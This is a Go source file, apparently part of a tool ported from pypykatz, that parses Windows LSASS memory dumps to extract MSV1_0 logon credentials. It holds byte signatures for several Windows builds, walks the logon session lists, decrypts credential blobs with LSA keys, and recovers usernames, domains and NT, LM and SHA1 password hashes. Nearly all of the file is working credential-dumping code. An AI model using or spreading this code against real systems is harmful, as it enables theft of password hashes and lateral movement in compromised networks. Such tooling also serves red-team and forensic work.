package minidump

import (
	"bytes"
	"encoding/binary"
)

// MSV1_0 credential extraction patterns
// Ported from pypykatz msv/templates.py

// MSVPattern defines the pattern for finding MSV1_0 credential list
type MSVPattern struct {
	Signature        []byte
	FirstEntryOffset int
	Offset2          int
}

// GetMSVPattern returns the appropriate pattern for the given Windows build
func GetMSVPattern(buildNumber uint32) *MSVPattern {
	// Windows 10 1903+ through Windows 11 2022
	if buildNumber >= 18362 && buildNumber < 20348 {
		return &MSVPattern{
			Signature:        []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74},
			FirstEntryOffset: 23,
			Offset2:          -4,
		}
	}

	// Windows 10 1803
	if buildNumber >= 17134 && buildNumber < 18362 {
		return &MSVPattern{
			Signature:        []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74},
			FirstEntryOffset: 23,
			Offset2:          -4,
		}
	}

	// Windows 10 1709-1803
	if buildNumber >= 16299 && buildNumber < 17134 {
		return &MSVPattern{
			Signature:        []byte{0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74},
			FirstEntryOffset: 23,
			Offset2:          -4,
		}
	}

	// Windows 10 1507-1607
	if buildNumber >= 10240 && buildNumber < 16299 {
		return &MSVPattern{
			Signature:        []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74},
			FirstEntryOffset: 16,
			Offset2:          -4,
		}
	}

	// Windows 8.1
	if buildNumber >= 9600 && buildNumber < 10240 {
		return &MSVPattern{
			Signature:        []byte{0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05},
			FirstEntryOffset: 36,
			Offset2:          -6,
		}
	}

	// Windows 7
	if buildNumber >= 7600 && buildNumber < 9200 {
		return &MSVPattern{
			Signature:        []byte{0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84},
			FirstEntryOffset: 19,
			Offset2:          -4,
		}
	}

	// Default to Windows 10 1903+ pattern
	return &MSVPattern{
		Signature:        []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74},
		FirstEntryOffset: 23,
		Offset2:          -4,
	}
}

// MSVCredential represents a decrypted MSV1_0 credential
type MSVCredential struct {
	LogonDomainName string
	UserName        string
	NtOwfPassword   [16]byte
	ShaOwPassword   [20]byte
	LmOwfPassword   [16]byte
}

// MSVCredentialResult contains extracted credential data from a decrypted blob
type MSVCredentialResult struct {
	Username string
	Domain   string
	NTHash   string
	SHA1Hash string
	LMHash   string
}

// FindMSVCredentials searches for MSV1_0 credentials in the dump
func (d *Dump) FindMSVCredentials(keys *LSAKeys) ([]Credential, error) {
	if keys == nil || (keys.AESKey == nil && keys.DESKey == nil) {
		return nil, nil // No keys to decrypt with
	}

	pattern := GetMSVPattern(d.SystemInfo.BuildNumber)

	// Search for the signature in memory
	sigOffset := bytes.Index(d.Memory, pattern.Signature)
	if sigOffset < 0 {
		return nil, nil // Signature not found
	}

	// Read LogonSessionListCount (for Windows 8+)
	// Located at sigOffset + pattern.Offset2
	logonSessionCount := 1
	if d.SystemInfo.BuildNumber >= 9200 { // Windows 8+
		countPtrOffset := sigOffset + pattern.Offset2
		// fmt.Printf("DEBUG: Offset2=%d, countPtrOffset=%d\n", pattern.Offset2, countPtrOffset)
		if countPtrOffset >= 0 && countPtrOffset+4 <= len(d.Memory) {
			// Read RIP-relative pointer to the count
			rel32 := int32(binary.LittleEndian.Uint32(d.Memory[countPtrOffset:]))
			countOffset := int64(countPtrOffset) + 4 + int64(rel32)
			// fmt.Printf("DEBUG: rel32=%d, countOffset=%d, byte at countOffset=%d\n", rel32, countOffset, d.Memory[countOffset])
			if countOffset >= 0 && countOffset+1 <= int64(len(d.Memory)) {
				logonSessionCount = int(d.Memory[countOffset])
				if logonSessionCount == 0 {
					logonSessionCount = 1
				}
				if logonSessionCount > 16 {
					logonSessionCount = 16 // Sanity limit
				}
			}
		}
	}

	// fmt.Printf("DEBUG: LogonSessionCount = %d\n", logonSessionCount)

	// Get pointer to LogonSessionList array
	listPtrOffset := sigOffset + pattern.FirstEntryOffset
	if listPtrOffset < 0 || listPtrOffset+4 > len(d.Memory) {
		return nil, nil
	}

	// Read the RIP-relative pointer to the list array
	rel32 := int32(binary.LittleEndian.Uint32(d.Memory[listPtrOffset:]))
	listArrayOffset := int64(listPtrOffset) + 4 + int64(rel32)

	if listArrayOffset < 0 || int(listArrayOffset)+8 > len(d.Memory) {
		return nil, nil
	}

	var allCreds []Credential
	seenLUIDs := make(map[uint64]bool) // Avoid duplicate entries

	// Iterate through all logon session list heads
	// fmt.Printf("DEBUG: Iterating through %d list heads\n", logonSessionCount)
	for i := 0; i < logonSessionCount; i++ {
		// Each list head is a PVOID (8 bytes on x64)
		listHeadOffset := listArrayOffset + int64(i*8)
		if int(listHeadOffset)+8 > len(d.Memory) {
			break
		}

		firstEntryVA := binary.LittleEndian.Uint64(d.Memory[listHeadOffset:])
		if firstEntryVA == 0 {
			continue
		}

		// Check if list head points to itself (empty list)
		headVA := d.OffsetToVA(listHeadOffset)
		if firstEntryVA == headVA {
			continue
		}

		// Walk this linked list
		creds, _ := d.walkMSVList(firstEntryVA, keys)
		for _, cred := range creds {
			// Deduplication by username+domain+hash
			key := cred.Username + "|" + cred.Domain + "|" + cred.NTHash
			if seenLUIDs[hash64(key)] {
				continue // Skip duplicate
			}
			seenLUIDs[hash64(key)] = true
			allCreds = append(allCreds, cred)
		}
	}

	return allCreds, nil
}

// hash64 computes a simple hash of a string for deduplication
func hash64(s string) uint64 {
	var h uint64 = 5381
	for i := 0; i < len(s); i++ {
		h = ((h << 5) + h) + uint64(s[i])
	}
	return h
}

// DebugMSV returns debug information about MSV credential finding
func (d *Dump) DebugMSV() string {
	if d.SystemInfo == nil {
		return "No system info"
	}

	pattern := GetMSVPattern(d.SystemInfo.BuildNumber)
	result := ""

	sigOffset := bytes.Index(d.Memory, pattern.Signature)
	if sigOffset < 0 {
		return "MSV signature NOT FOUND in memory\nPattern: " + bytesToHex(pattern.Signature)
	}
	result += "MSV signature found at offset: " + formatInt64(int64(sigOffset)) + "\n"

	// Get pointer to LogonSessionList
	listPtrOffset := sigOffset + pattern.FirstEntryOffset
	rel32 := int32(binary.LittleEndian.Uint32(d.Memory[listPtrOffset:]))
	listFileOffset := int64(listPtrOffset) + 4 + int64(rel32)
	result += "LogonSessionList at offset: " + formatInt64(listFileOffset) + "\n"

	if int(listFileOffset)+8 > len(d.Memory) {
		return result + "List offset out of bounds!"
	}

	// Read the first entry pointer (this is a VA!)
	firstEntryVA := binary.LittleEndian.Uint64(d.Memory[listFileOffset:])
	result += "First entry VA: " + formatUint64Hex(firstEntryVA) + "\n"

	firstEntryOffset := d.VAToOffset(firstEntryVA)
	result += "First entry offset: " + formatInt64(firstEntryOffset) + "\n"

	if firstEntryOffset < 0 || int(firstEntryOffset)+0x200 > len(d.Memory) {
		return result + "VA translation failed!"
	}

	entryData := d.Memory[firstEntryOffset : firstEntryOffset+0x200]

	// Scan for VAs at various offsets that could be credential pointers
	result += "\nScanning for credential list pointers:\n"
	for off := 0x98; off <= 0x150; off += 8 {
		ptr := binary.LittleEndian.Uint64(entryData[off:])
		if ptr > 0x10000 && ptr < 0x800000000000 {
			ptrOffset := d.VAToOffset(ptr)
			if ptrOffset >= 0 && int(ptrOffset)+32 <= len(d.Memory) {
				// Check if this looks like a credential list (Flink/Blink structure)
				ptrData := d.Memory[ptrOffset : ptrOffset+32]
				result += "  0x" + formatInt64(int64(off))[len(formatInt64(int64(off)))-2:] + ": " + formatUint64Hex(ptr)
				result += " -> " + bytesToHex(ptrData[:16]) + "\n"
			}
		}
	}

	return result
}

func formatInt64(n int64) string {
	if n < 0 {
		return "-" + formatUint64(uint64(-n))
	}
	return formatUint64(uint64(n))
}

func formatUint64(n uint64) string {
	if n == 0 {
		return "0"
	}
	result := ""
	for n > 0 {
		result = string(rune('0'+n%10)) + result
		n /= 10
	}
	return result
}

func formatUint64Hex(n uint64) string {
	const hex = "0123456789abcdef"
	result := "0x"
	started := false
	for i := 60; i >= 0; i -= 4 {
		d := (n >> i) & 0xf
		if d != 0 || started || i == 0 {
			result += string(hex[d])
			started = true
		}
	}
	return result
}

// walkMSVList walks the MSV credential linked list
func (d *Dump) walkMSVList(startVA uint64, keys *LSAKeys) ([]Credential, error) {
	var creds []Credential
	seen := make(map[uint64]bool)

	currentVA := startVA
	for i := 0; i < 256; i++ { // Max 256 entries to prevent infinite loop
		if currentVA == 0 {
			// fmt.Printf("DEBUG: Stopping walk - currentVA is 0\n")
			break
		}
		if seen[currentVA] {
			// fmt.Printf("DEBUG: Stopping walk - already seen VA 0x%x\n", currentVA)
			break
		}
		seen[currentVA] = true

		// Translate VA to offset
		offset := d.VAToOffset(currentVA)
		if offset < 0 {
			break
		}

		// Read enough data for the entry structure
		if int(offset)+0x200 > len(d.Memory) {
			break
		}
		entryData := d.Memory[offset:]

		// KIWI_MSV1_0_LIST_63 structure (Windows 10):
		// Flink: PVOID (8 bytes) - offset 0
		// Blink: PVOID (8 bytes) - offset 8
		// ... other fields ...
		// LocallyUniqueIdentifier (LUID): offset varies
		// Credentials pointer: offset varies

		// For Windows 10 build 18362, typical offsets:
		// Flink: 0, Blink: 8
		// LUID: 0x70
		// Credentials: 0x108

		// Read LUID at offset 0x70
		luid := binary.LittleEndian.Uint64(entryData[0x70:])

		// Try to extract credentials from this entry
		cred := d.extractMSVEntry(entryData, keys)

		hasHash := cred != nil && cred.NTHash != ""
		_ = cred != nil && cred.Username != "" // hasUser - used below
		/*
			fmt.Printf("DEBUG: LUID=%d Username=%q Domain=%q HasHash=%v\n", luid,
				func() string {
					if cred != nil {
						return cred.Username
					} else {
						return ""
					}
				}(),
				func() string {
					if cred != nil {
						return cred.Domain
					} else {
						return ""
					}
				}(),
				hasHash)
		*/
		_ = luid
		_ = hasHash

		// Include entry if it has a username (either from LogonSession or from MSV credential blob)
		if cred != nil && (cred.Username != "" || cred.NTHash != "") {
			creds = append(creds, *cred)
		}

		// Move to next entry (Flink)
		nextVA := binary.LittleEndian.Uint64(entryData[0:8])
		if nextVA == startVA {
			// fmt.Printf("DEBUG: Stopping walk - nextVA equals startVA (circular list complete)\n")
			break
		}
		if nextVA == currentVA {
			// fmt.Printf("DEBUG: Stopping walk - nextVA equals currentVA (self-loop)\n")
			break
		}
		currentVA = nextVA
	}

	return creds, nil
}

// extractMSVEntry extracts credentials from a KIWI_MSV1_0_LIST_63 entry
func (d *Dump) extractMSVEntry(data []byte, keys *LSAKeys) *Credential {
	if len(data) < 0x200 {
		return nil
	}

	// KIWI_MSV1_0_LIST_63 structure offsets (Windows 10 build 18362+):
	// Offset 0x00: Flink (PVOID, 8 bytes)
	// Offset 0x08: Blink (PVOID, 8 bytes)
	// Offset 0x70: LocallyUniqueIdentifier (LUID, 8 bytes)
	// Offset 0x90: UserName (LSA_UNICODE_STRING, 16 bytes)
	// Offset 0xA0: Domaine (LSA_UNICODE_STRING, 16 bytes)
	// Offset 0xF8: LogonServer (LSA_UNICODE_STRING, 16 bytes)
	// Offset 0x108: Credentials_list_ptr (PVOID, 8 bytes)

	// First, extract username and domain from the logon session itself
	cred := &Credential{
		CredType: "MSV1_0",
	}

	// Scan for valid LSA_UNICODE_STRING structures for username
	userFoundAt := -1
	for off := 0x90; off <= 0xE0; off += 8 {
		if off+16 > len(data) {
			continue
		}
		length := binary.LittleEndian.Uint16(data[off:])
		maxLen := binary.LittleEndian.Uint16(data[off+2:])
		bufVA := binary.LittleEndian.Uint64(data[off+8:])
		if length > 0 && length < 256 && maxLen >= length && bufVA > 0x10000 && bufVA < 0x800000000000 {
			str := d.readLSAUnicodeString(data, off)
			if str != "" && len(str) > 1 {
				cred.Username = str
				userFoundAt = off
				break
			}
		}
	}

	// Read Domain at UserName offset + 16
	if userFoundAt >= 0 && userFoundAt+32 <= len(data) {
		cred.Domain = d.readLSAUnicodeString(data, userFoundAt+16)
	}

	// Try to extract full credentials from Credentials_list_ptr at offset 0x108
	credListVA := binary.LittleEndian.Uint64(data[0x108:])
	var msvCred *MSVCredentialResult
	if credListVA != 0 {
		msvCred = d.extractFullCredFromCredList(credListVA, keys)
	}

	// If no credential found at 0x108, try other offsets as fallback
	if msvCred == nil {
		for _, off := range []int{0x118, 0xF8, 0xE8, 0xC8} {
			if off+8 > len(data) {
				continue
			}
			fallbackVA := binary.LittleEndian.Uint64(data[off:])
			if fallbackVA == 0 {
				continue
			}

			msvCred = d.extractFullCredFromCredList(fallbackVA, keys)
			if msvCred != nil {
				break
			}
		}
	}

	// Merge MSV credential result into the credential
	if msvCred != nil {
		// Use username/domain from MSV blob if LogonSession fields are empty
		if cred.Username == "" && msvCred.Username != "" {
			cred.Username = msvCred.Username
		}
		if cred.Domain == "" && msvCred.Domain != "" {
			cred.Domain = msvCred.Domain
		}
		cred.NTHash = msvCred.NTHash
		cred.SHA1Hash = msvCred.SHA1Hash
	}

	return cred
}

// readLSAUnicodeString reads an LSA_UNICODE_STRING from entry data
func (d *Dump) readLSAUnicodeString(data []byte, offset int) string {
	if offset+16 > len(data) {
		return ""
	}

	// LSA_UNICODE_STRING: Length(2) + MaxLength(2) + padding(4) + Buffer_ptr(8)
	length := binary.LittleEndian.Uint16(data[offset:])
	bufferVA := binary.LittleEndian.Uint64(data[offset+8:])

	// Debug: show what we're reading
	// fmt.Printf("DEBUG readLSAUnicodeString: offset=0x%x length=%d bufferVA=0x%x\n", offset, length, bufferVA)

	if length == 0 || length > 512 || bufferVA == 0 {
		return ""
	}

	bufferOffset := d.VAToOffset(bufferVA)
	if bufferOffset < 0 || int(bufferOffset)+int(length) > len(d.Memory) {
		return ""
	}

	// Read UTF-16LE string
	strData := d.Memory[bufferOffset : int(bufferOffset)+int(length)]
	result := ""
	for i := 0; i < len(strData)-1; i += 2 {
		ch := uint16(strData[i]) | uint16(strData[i+1])<<8
		if ch == 0 {
			break
		}
		if ch < 128 {
			result += string(rune(ch))
		}
	}
	return result
}

// extractFullCredFromCredList follows the credential list and extracts full MSV credential
func (d *Dump) extractFullCredFromCredList(credListVA uint64, keys *LSAKeys) *MSVCredentialResult {
	credListOffset := d.VAToOffset(credListVA)
	if credListOffset < 0 || int(credListOffset)+0x20 > len(d.Memory) {
		return nil
	}

	// KIWI_MSV1_0_CREDENTIAL_LIST structure:
	// Flink: 8 bytes
	// AuthenticationPackageId: 4 bytes + 4 padding
	// PrimaryCredentials_ptr: 8 bytes (offset 0x10)
	credListData := d.Memory[credListOffset:]
	if len(credListData) < 0x20 {
		return nil
	}

	primaryCredVA := binary.LittleEndian.Uint64(credListData[0x10:])
	if primaryCredVA == 0 {
		return nil
	}

	primaryCredOffset := d.VAToOffset(primaryCredVA)
	if primaryCredOffset < 0 || int(primaryCredOffset)+0x100 > len(d.Memory) {
		return nil
	}

	// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC structure has encrypted credentials
	// We need to find the encrypted blob and decrypt it
	return d.decryptPrimaryCredential(d.Memory[primaryCredOffset:], keys)
}

// decryptPrimaryCredential decrypts and extracts full MSV credential from primary credential
func (d *Dump) decryptPrimaryCredential(data []byte, keys *LSAKeys) *MSVCredentialResult {
	if len(data) < 0x30 || keys == nil {
		return nil
	}

	// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC structure:
	// Flink: 8 bytes
	// Primary (ANSI_STRING): Length(2) + MaxLength(2) + padding(4) + Buffer_ptr(8) = 16 bytes
	// encrypted_credentials (LSA_UNICODE_STRING): Length(2) + MaxLength(2) + padding(4) + Buffer_ptr(8)

	// Read encrypted_credentials LSA_UNICODE_STRING at offset 0x18
	encCredLength := binary.LittleEndian.Uint16(data[0x18:])
	encCredBufferVA := binary.LittleEndian.Uint64(data[0x20:])

	if encCredLength == 0 || encCredLength > 1024 || encCredBufferVA == 0 {
		return nil
	}

	// Translate VA to get the encrypted data
	encDataOffset := d.VAToOffset(encCredBufferVA)
	if encDataOffset < 0 || int(encDataOffset)+int(encCredLength) > len(d.Memory) {
		return nil
	}

	encData := d.Memory[encDataOffset : int(encDataOffset)+int(encCredLength)]

	var decrypted []byte
	var err error

	// Algorithm selection based on data size (matches pypykatz logic):
	// - If len % 8 != 0 → AES-CFB
	// - If len % 8 == 0 → 3DES-CBC
	if len(encData)%8 != 0 {
		// AES-CFB for non-8-byte-aligned data
		if keys.AESKey == nil || keys.IV == nil {
			return nil
		}
		decrypted, err = DecryptCredential(encData, keys.AESKey, keys.IV, true)
	} else {
		// 3DES-CBC for 8-byte-aligned data (like 424-byte credential blobs)
		if keys.DESKey == nil || keys.IV == nil {
			return nil
		}
		decrypted, err = DecryptCredential(encData, keys.DESKey, keys.IV[:8], false)
	}

	if err != nil || len(decrypted) < 0x60 {
		return nil
	}

	// MSV1_0_PRIMARY_CREDENTIAL_10_1607_DEC structure (after decryption):
	// 0x00: LogonDomainName (LSA_UNICODE_STRING, 16 bytes)
	// 0x10: UserName (LSA_UNICODE_STRING, 16 bytes)
	// 0x20: pNtlmCredIsoInProc (PVOID, 8 bytes)
	// 0x28: isIso, isNtOwfPassword, isLmOwfPassword, isShaOwPassword, isDPAPIProtected (5 bytes)
	// 0x2D: align0, align1, align2 (3 bytes)
	// 0x30: credKeyType (4 bytes) + isoSize (2 bytes)
	// 0x36: DPAPIProtected (20 bytes)
	// 0x4a: NtOwfPassword (16 bytes)
	// 0x5a: LmOwfPassword (16 bytes)
	// 0x6a: ShaOwPassword (20 bytes)

	result := &MSVCredentialResult{}

	// Extract domain and username from the decrypted blob
	// These are inline LSA_UNICODE_STRING structures with embedded data
	result.Domain = d.readInlineUnicodeString(decrypted, 0)
	result.Username = d.readInlineUnicodeString(decrypted, 0x10)

	// Check isIso flag at offset 0x28
	isIso := decrypted[0x28] != 0

	if !isIso && len(decrypted) >= 0x7e {
		// NtOwfPassword is at offset 0x4a
		ntHash := decrypted[0x4a : 0x4a+16]
		if isValidHash(ntHash) {
			result.NTHash = bytesToHex(ntHash)
		}

		// LmOwfPassword is at offset 0x5a
		lmHash := decrypted[0x5a : 0x5a+16]
		if isValidHash(lmHash) {
			result.LMHash = bytesToHex(lmHash)
		}

		// ShaOwPassword is at offset 0x6a
		sha1Hash := decrypted[0x6a : 0x6a+20]
		if isValidSHA1Hash(sha1Hash) {
			result.SHA1Hash = bytesToHex(sha1Hash)
		}
	}

	// Fallback: scan for valid-looking NT hash in decrypted data if not found
	if result.NTHash == "" {
		for offset := 0x4c; offset <= 0x80 && offset+16 <= len(decrypted); offset += 4 {
			hashData := decrypted[offset : offset+16]
			if isValidHash(hashData) {
				result.NTHash = bytesToHex(hashData)
				break
			}
		}
	}

	// Return nil if we didn't find a valid NT hash
	if result.NTHash == "" {
		return nil
	}

	return result
}

// readInlineUnicodeString reads a Unicode string from decrypted credential data
// The string data follows the LSA_UNICODE_STRING structure inline
func (d *Dump) readInlineUnicodeString(data []byte, offset int) string {
	if offset+16 > len(data) {
		return ""
	}

	// LSA_UNICODE_STRING: Length(2) + MaxLength(2) + padding(4) + Buffer_ptr(8)
	length := binary.LittleEndian.Uint16(data[offset:])
	if length == 0 || length > 256 {
		return ""
	}

	// In decrypted blob, the buffer pointer is relative to start of decrypted data
	// The string data is embedded after the main structure
	bufferOffset := binary.LittleEndian.Uint64(data[offset+8:])

	// The buffer offset may be a VA or an offset - try to interpret it
	// If bufferOffset looks like an offset into the decrypted data (small value), use it directly
	if bufferOffset < uint64(len(data)) && int(bufferOffset)+int(length) <= len(data) {
		return decodeUTF16LE(data[bufferOffset : int(bufferOffset)+int(length)])
	}

	// Otherwise try to translate as VA
	fileOffset := d.VAToOffset(bufferOffset)
	if fileOffset >= 0 && int(fileOffset)+int(length) <= len(d.Memory) {
		return decodeUTF16LE(d.Memory[fileOffset : int(fileOffset)+int(length)])
	}

	return ""
}

// isValidSHA1Hash checks if 20 bytes look like a valid SHA1 hash
func isValidSHA1Hash(data []byte) bool {
	if len(data) != 20 {
		return false
	}
	// Check if all zeros or all same byte (likely not a real hash)
	allZero := true
	allSame := true
	first := data[0]
	for _, b := range data {
		if b != 0 {
			allZero = false
		}
		if b != first {
			allSame = false
		}
	}
	return !allZero && !allSame
}

// findNTHashInDecrypted looks for NT hash pattern in decrypted credential data
func findNTHashInDecrypted(data []byte) string {
	// MSV1_0_PRIMARY_CREDENTIAL structure has NT hash after flag bytes
	// Try various offsets where NT hash could be
	for offset := 16; offset <= 64; offset += 4 {
		if offset+16 > len(data) {
			break
		}
		hashData := data[offset : offset+16]
		if isValidHash(hashData) {
			return bytesToHex(hashData)
		}
	}
	return ""
}

// decryptBlob decrypts a credential blob using the LSA keys
func (d *Dump) decryptBlob(enc []byte, keys *LSAKeys) []byte {
	if len(enc) == 0 {
		return nil
	}

	// Choose algorithm based on size
	if len(enc)%8 != 0 {
		// AES-CFB for non-block-aligned data
		if keys.AESKey != nil && keys.IV != nil {
			dec, err := DecryptCredential(enc, keys.AESKey, keys.IV, true)
			if err == nil {
				return dec
			}
		}
	} else {
		// 3DES-CBC for block-aligned data
		if keys.DESKey != nil && keys.IV != nil {
			dec, err := DecryptCredential(enc, keys.DESKey, keys.IV[:8], false)
			if err == nil {
				return dec
			}
		}
	}

	return nil
}

// parseMSVDecrypted parses decrypted MSV1_0 credential data
func (d *Dump) parseMSVDecrypted(data []byte) *Credential {
	if len(data) < 48 {
		return nil
	}

	// MSV1_0_PRIMARY_CREDENTIAL_10_1607_DEC structure (Windows 10 1607+):
	// isIso: BOOLEAN
	// isNtOwfPassword: BOOLEAN
	// isLmOwfPassword: BOOLEAN
	// isShaOwPassword: BOOLEAN
	// ... other flags ...
	// LogonDomainName: LSA_UNICODE_STRING
	// UserName: LSA_UNICODE_STRING
	// NtOwfPassword: 16 bytes
	// LmOwfPassword: 16 bytes
	// ShaOwPassword: 20 bytes

	// Try to extract strings and hashes from decrypted data
	cred := &Credential{
		CredType: "MSV1_0",
	}

	// Look for NT hash pattern (16 bytes that look like a hash)
	for i := 0; i < len(data)-16; i++ {
		hashData := data[i : i+16]
		if isValidHash(hashData) {
			// Found potential NT hash
			cred.NTHash = bytesToHex(hashData)
			break
		}
	}

	// Try to extract username and domain from LSA_UNICODE_STRING structures
	// These are typically near the start of the structure

	return cred
}

// bytesToHex converts bytes to hex string
func bytesToHex(b []byte) string {
	const hex = "0123456789abcdef"
	result := make([]byte, len(b)*2)
	for i, v := range b {
		result[i*2] = hex[v>>4]
		result[i*2+1] = hex[v&0x0f]
	}
	return string(result)
}
